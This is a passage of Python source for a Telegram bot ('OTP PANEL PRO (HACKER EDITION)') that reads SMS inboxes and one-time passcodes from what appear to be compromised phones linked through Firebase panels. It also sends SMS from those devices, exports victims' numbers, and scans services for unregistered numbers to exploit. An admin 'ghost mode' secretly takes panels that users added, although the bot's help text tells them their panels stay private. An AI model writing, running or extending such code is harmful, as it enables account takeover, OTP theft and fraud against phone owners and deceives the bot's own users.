    ghost_btn = "👻 Steal User Panels: ON" if is_ghost else "👻 Steal User Panels: OFF"
    
    keys = [
        [InlineKeyboardButton(ghost_btn, callback_data="toggle_ghost")],
        [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
        [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
        [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
        [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
    ]
    return InlineKeyboardMarkup(keys)

async def safe_edit(query, text, reply_markup=None, parse_mode=None, disable_web_page_preview=False):
    try:
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
    except BadRequest as e:
        if "not modified" not in str(e).lower(): tlog(f"Edit Message Error: {e}")
    except Exception as e:
        tlog(f"Safe Edit Unexpected Error: {e}")

# ═══════════════════════════════════════════════════════
#  CORE DEVICE FETCHER (WITH GHOST MODE INTEGRATION)
# ═══════════════════════════════════════════════════════

async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None, auto_fallback: bool = True) -> list[Device]:
    if users_db is None: users_db = {}
    uinfo = users_db.get(chat_id, {})
    is_vip = uinfo.get("vip_until", 0) > time.time()
    is_admin = chat_id in ADMIN_IDS
    steal_mode = uinfo.get("user_panels_mode", False) and is_admin
    custom_dbs = get_user_dbs(uinfo)
    
    dbs_to_check = []
    
    if steal_mode:
        for uid, u_data in all_users.items():
            if uid not in ADMIN_IDS:
                for i, _ in enumerate(get_user_dbs(u_data)):
                    dbs_to_check.append(f"U_{uid}_{i}")
    else:
        if not custom_dbs and (is_vip or is_admin):
            return GLOBAL_DEVICE_CACHE.get("ALL", [])
        if is_admin or is_vip:
            dbs_to_check.extend(list(DATABASES.keys()))
            for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
                dbs_to_check.append(f"G_{i}")
        for i, _ in enumerate(custom_dbs):
            dbs_to_check.append(f"U_{chat_id}_{i}")

    devices = []
    for tag in dbs_to_check:
        devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))

    unique_devices = []
    seen_ids_set = set()
    seen_numbers = set()

    for d in devices:
        if d.id in seen_ids_set:
            continue
        seen_ids_set.add(d.id)
        if d.numbers:
            new_nums = [num for num in d.numbers if num not in seen_numbers]
            if not new_nums:
                continue 
            d.numbers = new_nums
            seen_numbers.update(new_nums)
        unique_devices.append(d)

    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if len(d.numbers) > 0 else 1, -d.timestamp))
    
    if steal_mode and not unique_devices and auto_fallback:
        all_users[chat_id]["user_panels_mode"] = False
        save_user(chat_id)
        if _main_app:
            asyncio.create_task(_main_app.bot.send_message(chat_id, "⚠️ **GHOST MODE AUTO-OFF:** Stolen User panels are currently empty or offline. Reverted back to 300+ global panels.", parse_mode="Markdown"))
        return await get_all_devices(bot_token, chat_id, users_db, auto_fallback=False)
        
    return unique_devices

# ═══════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    bot_token = ctx.bot.token
    user = update.effective_user
    
    if not await check_force_join(ctx.bot, chat_id):
        join_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Join Channel 1", url="https://t.me/sabkijayhokhush")],
            [InlineKeyboardButton("Join Channel 2", url="https://t.me/leakmethodfree")],
            [InlineKeyboardButton("Join Group", url="https://t.me/rosekhudkabanaya")],
            [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
        ])
        await update.message.reply_text("⚠️ **ACCESS DENIED**\n\nAapko bot use karne ke liye pehle hamare sabhi Channels aur Group join karne honge. Join karke 'I have joined' par click karein.", reply_markup=join_kb, parse_mode="Markdown")
        return

    args = ctx.args
    if chat_id not in all_users:
        all_users[chat_id] = {
            "name": user.first_name,
            "username": user.username or "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "verified": True,
            "referrals": 0,
            "coins": 0,
            "vip_until": 0.0,
            "otp_count": 0,
            "custom_dbs": [],
            "user_panels_mode": False,
            "referred_by": None
        }
        if args and args[0].startswith("ref_"):
            try:
                referrer_id = int(args[0].split("_")[1])
                if referrer_id in all_users and referrer_id != chat_id:
                    all_users[chat_id]["referred_by"] = referrer_id
                    all_users[referrer_id]["referrals"] += 1
                    
                    if all_users[referrer_id]["referrals"] % 20 == 0:
                        all_users[referrer_id]["vip_until"] = time.time() + (24 * 3600)
                        try:
                            await ctx.bot.send_message(referrer_id, "🎉 **CONGRATULATIONS!**\nAapke 20 refers pure ho gaye! Aapko **24 Hours ka VIP Access (Global Panels)** mil gaya hai!", parse_mode="Markdown")
                        except: pass
            except: pass
        save_user(chat_id)

    user_focus.setdefault(bot_token, {}).pop(chat_id, None)
    chats_registry.setdefault(bot_token, set()).add(chat_id)
    
    welcome_text = (
        f"🔥 **OTP PANEL PRO (HACKER EDITION)** 🔥\n━━━━━━━━━━━━━━━━━━\n"
        f"Welcome Master {user.first_name}!\n\n"
        "System is connected. Focus on a device to receive live OTPs.\n\n"
        "🆓 **Free Users:** Aap sirf apne Custom Panels add karke dekh sakte hain.\n"
        "👑 **VIP Users (20 Refer):** 24 hours ke liye Unlimited Global Panels access karein."
    )
    await update.message.reply_text(welcome_text, reply_markup=get_reply_menu(chat_id), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════
#  CALLBACK QUERY HANDLER
# ═══════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query   = update.callback_query
    data    = query.data or ""
    chat_id = query.message.chat_id
    bot_token = ctx.bot.token
    users_db = all_users

    try:
        if data == "check_join":
            if await check_force_join(ctx.bot, chat_id):
                await query.answer("Welcome to OTP Panel!", show_alert=True)
                await safe_edit(query, "✅ Validation Successful. Send /start to access menu.")
            else:
                await query.answer("Aapne abhi tak saare Channels join nahi kiye hain!", show_alert=True)
            return

        if not await check_force_join(ctx.bot, chat_id):
            await query.answer("Aap channels se left ho gaye hain. Pehle join karein!", show_alert=True)
            return

        await query.answer()

        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return
            
        if data == "toggle_ghost":
            curr = users_db.get(chat_id, {}).get("user_panels_mode", False)
            users_db.setdefault(chat_id, {})["user_panels_mode"] = not curr
            save_user(chat_id)
            await safe_edit(query, admin_panel_text(bot_token, chat_id), reply_markup=admin_keyboard(bot_token, chat_id))
            return

        if data == "open_checker_menu":
            await safe_edit(query, "<b>Select Checker (Manual Bulk)</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
            return

        if data == "open_auto_checker_menu":
            await safe_edit(query, "🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
            return

        if data.startswith("chk_srv:"):
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "check_number_input", "service": service}
            await safe_edit(query, f"Send a 10 digit number OR multiple numbers (separated by space) to manually check on {service.capitalize()}:")
            return

        if data.startswith("auto_fb:"):
            service = data.split(":")[1]
            
            if service not in PREFETCH_TASKS:
                PREFETCH_TASKS[service] = asyncio.create_task(continuous_prefetch_worker(service))
                
            pool = PREFETCH_POOL.setdefault(service, [])
            seen_set = user_seen_unreg.setdefault(chat_id, set())
            
            valid_item = None
            while pool:
                item = pool.pop(0)
                if item["num"] not in seen_set:
                    valid_item = item
                    break
                    
            if valid_item:
                final_dev = valid_item["device"]
                final_res = valid_item["res"]
                final_num = valid_item["num"]
                
                seen_set.add(final_num)
                await safe_edit(query, f"⚡ <b>INSTANT CACHE HIT (Ghost Worker)</b>\n━━━━━━━━━━━━━━━━━━\n📡 *Loading pre-fetched number...*", parse_mode="HTML")
                await asyncio.sleep(0.3)
                
                await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
                
                time_diff = int(time.time() - final_dev.last_sms_ts)
                mins_ago = time_diff // 60
                secs_ago = time_diff % 60
                last_sms_str = f"{mins_ago}m {secs_ago}s ago" if mins_ago > 0 else f"{secs_ago}s ago"
                
                res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
                res_text += f"\n\n📡 <b>Device Activity:</b>\n⏱️ Last SMS: <code>{last_sms_str}</code>\n🔋 Battery: {final_dev.battery}%"
                
                kb = [
                    [InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{final_dev.id}:{service}")],
                    [InlineKeyboardButton("🔍 Search Number", callback_data=f"search_num:{final_num[-10:]}")],
                    [InlineKeyboardButton("🔄 Find Another Fresh Number", callback_data=data)],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
                ]
                return await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

            await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Fetching ONLINE devices active in last 30 MINUTES...</i>", parse_mode="HTML")
            
            all_devices = await get_all_devices(bot_token, chat_id, users_db)
            if not all_devices:
                return await safe_edit(query, "❌ No devices found. Please Add Custom Panels or Refer to get VIP Global access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

            fresh_devices = []
            for d in all_devices:
                if d.status == "online" and d.numbers:
                    is_valid, last_ts = await verify_recent_sms(d, max_age_sec=1800)
                    if is_valid:
                        d.last_sms_ts = last_ts
                        fresh_devices.append(d)
            
            if not fresh_devices: 
                return await safe_edit(query, "❌ Koi bhi number pichle 30 minute me online/active nahi mila. OTP aane ki chance low hai.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            
            random.shuffle(fresh_devices)
            if len(seen_set) > 5000: seen_set.clear() 
            fresh_devices = [d for d in fresh_devices if d.numbers[0] not in seen_set]
            
            found_unreg, final_res, final_dev, final_num = False, None, None, ""
            
            if len(fresh_devices) == 0:
                return await safe_edit(query, "✅ Saare active numbers already check ho chuke hain. Kuch minutes baad try karein.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

            check_pool = fresh_devices[:100] 
            await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 Scanning {len(check_pool)} Active Numbers...\n⚡ <i>Hitting APIs concurrently...</i>", parse_mode="HTML")
            
            tasks = [check_number_api(service, d.numbers[0]) for d in check_pool]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for d, res in zip(check_pool, results):
                if isinstance(res, dict) and not res.get("status") == "error":
                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                    if not is_reg:
                        found_unreg, final_res, final_dev, final_num = True, res, d, d.numbers[0]
                        break
                        
            if found_unreg:
                seen_set.add(final_num)
                await safe_edit(query, f"🔥 **ZERO-DAY HACKER MODE**\n━━━━━━━━━━━━━━━━━━\n🎯 **Unregistered Found:** `+{final_num[-10:]}`\n\n💉 *Injecting Wakeup SMS...*", parse_mode="Markdown")
                await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
                
                time_diff = int(time.time() - final_dev.last_sms_ts)
                mins_ago = time_diff // 60
                secs_ago = time_diff % 60
                last_sms_str = f"{mins_ago}m {secs_ago}s ago" if mins_ago > 0 else f"{secs_ago}s ago"
                
                res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
                res_text += f"\n\n📡 <b>Device Activity:</b>\n⏱️ Last SMS: <code>{last_sms_str}</code>\n🔋 Battery: {final_dev.battery}%"
                
                kb = [
                    [InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{final_dev.id}:{service}")],
                    [InlineKeyboardButton("🔍 Search Number", callback_data=f"search_num:{final_num[-10:]}")],
                    [InlineKeyboardButton("🔄 Find Another Fresh Number", callback_data=data)],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
                ]
                await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
            else:
                await safe_edit(query, f"<b>✅ ALL REGISTERED</b>\n\nScanned {len(check_pool)} fresh active numbers. ALL are registered.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Scan Again", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")
            return

        if data.startswith("search_num:"):
            search_term = data.split(":")[1]
            await safe_edit(query, f"⏳ Searching databases for {search_term}...")
            all_devices = await get_all_devices(bot_token, chat_id, users_db)
            found_devs = [d for d in all_devices if any(search_term in num for num in d.numbers) and d.status == "online"]
            if not found_devs: return await safe_edit(query, f"📭 No online devices found for {search_term}.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:10]]
            rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
            return await safe_edit(query, f"🔍 Search Results for: {search_term}\nSelect below to open inbox:", reply_markup=InlineKeyboardMarkup(rows))

        if data.startswith("del_panel:"):
            idx_to_del = int(data.split(":")[1])
            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
            if 0 <= idx_to_del < len(dbs):
                deleted_url = dbs.pop(idx_to_del)
                save_user(chat_id)
                await query.answer("Panel Deleted Successfully!", show_alert=True)
            
            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
            if not dbs:
                await safe_edit(query, "You have no custom panels left.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                return
            kb = []
            for i, db in enumerate(dbs):
                url_str = db if isinstance(db, str) else db.get("url", "")
                kb.append([InlineKeyboardButton(f"❌ Delete: {url_str[:25]}...", callback_data=f"del_panel:{i}")])
            kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
            await safe_edit(query, "🗑 **Delete Custom Panels**\nSelect a panel to remove it from your account:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
            return

        if data == "sa_add_global_panel":
            pending_action[chat_id] = {"action": "sa_set_global_panel"}
            await safe_edit(query, "ADD GLOBAL PANEL\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL (ya multiple URLs enter se separate karke) bhejein.\n\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))
            return

        if data == "sa_view_user_panels":
            msg_text = "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n"
            for uid, uinfo in users_db.items():
                dbs = get_user_dbs(uinfo)
                if dbs:
                    msg_text += f"User: {uid}\n"
                    for db in dbs: msg_text += f"{db}\n"
                    msg_text += "\n"
            if msg_text == "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n":
                msg_text += "Koi custom panel nahi mila."
            if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
            await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
            return

        if data == "sa_export_numbers":
            devices = await get_all_devices(bot_token, chat_id, users_db)
            online_nums = []
            for d in devices:
                if d.status == "online":
                    online_nums.extend(d.numbers)
            if not online_nums:
                await query.answer("Filhal koi bhi number online nahi hai.", show_alert=True)
                return
            file_path = os.path.join(SYS_DIR, "Online_Numbers.txt")
            unique_online = set(online_nums)
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("\n".join(unique_online))
            await ctx.bot.send_document(
                chat_id=chat_id, document=open(file_path, "rb"), 
                filename="Active_Online_Numbers.txt", caption=f"Total Active Unique Numbers: {len(unique_online)}"
            )
            return

        if data == "sa_download_logs":
            if not os.path.exists(SMS_LOG_FILE):
                await query.answer("Log file abhi tak bani nahi hai.", show_alert=True)
                return
            await ctx.bot.send_document(chat_id=chat_id, document=open(SMS_LOG_FILE, "rb"), filename="Master_SMS_Log.txt", caption="Master SMS Database Log")
            return

        if data == "admin_refresh":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await safe_edit(query, admin_panel_text(bot_token, chat_id), reply_markup=admin_keyboard(bot_token, chat_id))
            return

        if data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            devices = await get_all_devices(bot_token, chat_id, users_db)
            if not devices:
                if chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("vip_until", 0) > time.time():
                    await safe_edit(query, "⏳ **System Syncing...**\n\nBot abhi 300+ panels se live devices fetch kar raha hai. Kripya 15-20 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
                else:
                    await safe_edit(query, "❌ No devices found. Please Add Custom Panels or Refer to get VIP Global access.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
                return
            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
            return

        if data.startswith("pg:"):
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            page = int(data[3:])
            devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))
            return

        if data == "online":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, f"ONLINE NUMBERS\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices))
            return

        if data.startswith("cp:"):
            await query.answer(f"OTP: {data[3:]}", show_alert=True)
            return

        if data.startswith("sel:"):
            dev_id = data[4:]
            devices = await get_all_devices(bot_token, chat_id, users_db)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("Device not found!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"CONNECTED TO DEVICE\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\nYou are now receiving LIVE OTPs for this number. Click Disconnect to stop."
            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id))
            return

        if data.startswith("msgs:"):
            parts = data.split(":")
            dev_id = parts[1]
            service_used = parts[2] if len(parts) > 2 else ""

            devices = await get_all_devices(bot_token, chat_id, users_db)
            device = next((d for d in devices if d.id == dev_id), None)
            
            if not device:
                await query.answer("Device not found in active list!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            
            smss  = await get_device_sms(device, limit=10, max_age_sec=3600)
            
            if service_used:
                back_btn = InlineKeyboardButton("🔙 Back to Checker", callback_data=f"auto_fb:{service_used}")
            else:
                back_btn = InlineKeyboardButton("🔙 Back to Home", callback_data="home")
                
            refresh_btn = InlineKeyboardButton("🔄 Refresh Inbox", callback_data=data)
            
            if not smss:
                await safe_edit(query, f"📭 **Inbox Empty (Last 1 Hour)**\n📱 Number: `{label}`\n\nIs number par pichle 1 ghante me koi SMS nahi aaya hai. Kripya 10-15 seconds wait karein aur **Refresh Inbox** par click karein.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="Markdown")
                return
                
            header = f"📩 **FAST INBOX (Last 1 Hour)**\n━━━━━━━━━━━━━━━━━━\n📱 **Number:** `{label}`\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons, has_otp = [], [], False
            
            for sms in smss:
                block, otp = format_sms_block_markdown(sms)
                body_parts.append(block)
                if otp:
                    has_otp = True
                    otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
            
            if has_otp: 
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
                save_user(chat_id)
                
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Truncated]"
            
            otp_buttons.append([refresh_btn, back_btn])
            await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons), parse_mode="Markdown")
            return

        if data.startswith("info:"):
            dev_id = data[5:]
            devices = await get_all_devices(bot_token, chat_id, users_db)
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("Device not found!", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"DEVICE DETAILS\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n"
            for i, num in enumerate(device.numbers, 1): text += f"SIM {i}   : {num}\n"
            if device.device_info: text += f"\n{device.device_info}\n"
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Back", callback_data=f"sel:{dev_id}")],
                [InlineKeyboardButton("Disconnect & Back",  callback_data="home")],
            ])
            await safe_edit(query, text, reply_markup=kb)
            return

    except Exception as e:
        tlog(f"Callback error [{data}]: {e}")
        try: await query.answer("An error occurred, please try again.", show_alert=True)
        except: pass

# ═══════════════════════════════════════════════════════
#  TEXT MESSAGE HANDLER
# ═══════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text    = (update.message.text or "").strip()
    bot_token = ctx.bot.token
    
    if not await check_force_join(ctx.bot, chat_id):
        join_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Join Channel 1", url="https://t.me/sabkijayhokhush")],
            [InlineKeyboardButton("Join Channel 2", url="https://t.me/leakmethodfree")],
            [InlineKeyboardButton("Join Group", url="https://t.me/rosekhudkabanaya")],
            [InlineKeyboardButton("✅ I have joined", callback_data="check_join")]
        ])
        await update.message.reply_text("⚠️ **ACCESS DENIED**\n\nAapko bot use karne ke liye pehle hamare channels join karne honge.", reply_markup=join_kb, parse_mode="Markdown")
        return

    users_db = all_users
    if is_spamming(chat_id): return

    if text == "Manual Checker":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
        return

    if text == "Auto-Check Panels":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
        return

    if text == "Refer & Earn VIP":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        uinfo = users_db.get(chat_id, {})
        ref_count = uinfo.get("referrals", 0)
        bot_user = await ctx.bot.get_me()
        ref_link = f"https://t.me/{bot_user.username}?start=ref_{chat_id}"
        
        msg = (
            "🎁 **REFER & EARN VIP ACCESS**\n━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Your Referrals:** {ref_count} / 20\n\n"
            "20 dosto ko invite karein aur **24 Ghante ke liye Unlimited Global Panels** ka access paayein!\n\n"
            f"🔗 **Share Your Link:**\n`{ref_link}`"
        )
        await update.message.reply_text(msg, parse_mode="Markdown")
        return

    if text == "Help / Get Panels":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        msg = (
            "💡 **HOW TO USE THIS BOT**\n━━━━━━━━━━━━━━━━━━\n"
            "Agar aapke paas VIP access nahi hai, toh aap apne khud ke Firebase OTP Panels add karke unka number/OTP dekh sakte hain.\n\n"
            "**Panels kahan se milenge?**\n"
            "Hamare official bot 👉 @panelsotpbot par jayein, wahan apna OTP dekar apni Firebase URL banwayein aur yahan 'Add Custom Panel' me daalein.\n\n"
            "**Kya mera Panel private rahega?**\n"
            "Haan! Free users jo panels add karte hain, wo sirf unhi ko dikhte hain. OTP bhi sirf unko aayega."
        )
        await update.message.reply_text(msg, parse_mode="Markdown")
        return

    if text == "Delete Custom Panel":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
        if not dbs:
            await update.message.reply_text("You haven't added any custom panels to delete.")
            return
            
        kb = []
        for i, db in enumerate(dbs):
            url_str = db if isinstance(db, str) else db.get("url", "")
            kb.append([InlineKeyboardButton(f"❌ Delete: {url_str[:25]}...", callback_data=f"del_panel:{i}")])
        kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
        
        await update.message.reply_text("🗑 **Delete Custom Panels**\nSelect a panel to remove it from your account:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
        return

    if text == "Add Custom Panel":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action[chat_id] = {"action": "set_personal_db"}
        await update.message.reply_text("➕ **ADD CUSTOM PANELS**\n━━━━━━━━━━━━━━━━━━\nAap apni ek ya multiple Firebase URLs bhej sakte hain (Paragraph ya list format me). Bot automatically link extract kar lega.\n\nCancel: /cancel", parse_mode="Markdown")
        return

    if text == "Super Admin" and chat_id in ADMIN_IDS:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text(admin_panel_text(bot_token, chat_id), reply_markup=admin_keyboard(bot_token, chat_id))
        return

    if text == "Devices List":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action.pop(chat_id, None)
        devices = await get_all_devices(bot_token, chat_id, users_db)
        if not devices:
            if chat_id in ADMIN_IDS or users_db.get(chat_id, {}).get("vip_until", 0) > time.time():
                await update.message.reply_text("⏳ **System Syncing...**\n\nBot abhi 300+ panels se live devices fetch kar raha hai. Kripya 15-20 seconds wait karein aur phir se click karein.", parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Aapke paas abhi koi active devices nahi hain. 'Add Custom Panel' se panel add karein ya VIP lein.")
            return
        await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
        return

    if text == "Scan Hidden Devices":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        wait_msg = await update.message.reply_text("Scanning devices without numbers for hidden numbers...\n\nChecking active devices, please wait...")
        
        devices = await get_all_devices(bot_token, chat_id, users_db)
        target_devices = [d for d in devices if not d.numbers]
        
        if not target_devices:
            await wait_msg.edit_text("Sabhi devices me already numbers linked hain. Koi hidden number wala device nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
            return
            
        results = []
        kb = []
        phone_pattern = re.compile(r"(?<!\d)([6-9]\d{9})(?!\d)")
        found_count = 0
        for d in target_devices[:50]: 
            smss = await get_device_sms(d, limit=20, max_age_sec=86400) 
            found_nums = set()
            sample_sms = ""
            for sms in smss:
                body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                matches = phone_pattern.findall(body)
                for m in matches:
                    found_nums.add(m)
                    if not sample_sms:
                        sample_sms = body[:40].replace('\n', ' ') + "..."
            if found_nums:
                found_count += 1
                results.append(f"Device: {d.name} ({d.id[:6]})\nPossible Nums: {', '.join(found_nums)}\nSMS: {sample_sms}\n")
                if len(kb) < 90: 
                    kb.append([InlineKeyboardButton(f"View Inbox: {list(found_nums)[0][:5]}...", callback_data=f"msgs:{d.id}")])
                    
        if found_count == 0:
            await wait_msg.edit_text("Scanning complete. Last 24 hours me koi 10-digit hidden number nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
            return
            
        kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
        results_text = "DEEP SCAN RESULTS\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(results)
        if len(results_text) > 4000: results_text = results_text[:4000] + "\n\n...[Truncated]"
        await wait_msg.edit_text(results_text, reply_markup=InlineKeyboardMarkup(kb))
        return

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            await update.message.reply_text("Action cancelled.", reply_markup=get_reply_menu(chat_id))
        else:
            await update.message.reply_text("No pending action to cancel.")
        return

    state = pending_action.get(chat_id)
    if not state: return

    action = state.get("action")
    
    if action == "check_number_input":
        raw_nums = re.sub(r"\D", " ", text).split()
        target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
        if not target_nums:
            await update.message.reply_text("❌ Invalid input! Koi valid 10-digit Indian number nahi mila.")
            return
        
        service = state["service"]
        pending_action.pop(chat_id)
        
        if len(target_nums) == 1:
            number = target_nums[0]
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...")
            res = await check_number_api(service, number)
            
            is_error = res.get("status") == "error"
            ms = res.get("ms", 0)
            is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
            
            res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
            
            kb = []
            if not is_reg and not is_error:
                kb.append([InlineKeyboardButton("🔍 Find this Number in Panels", callback_data=f"search_num:{number}")])
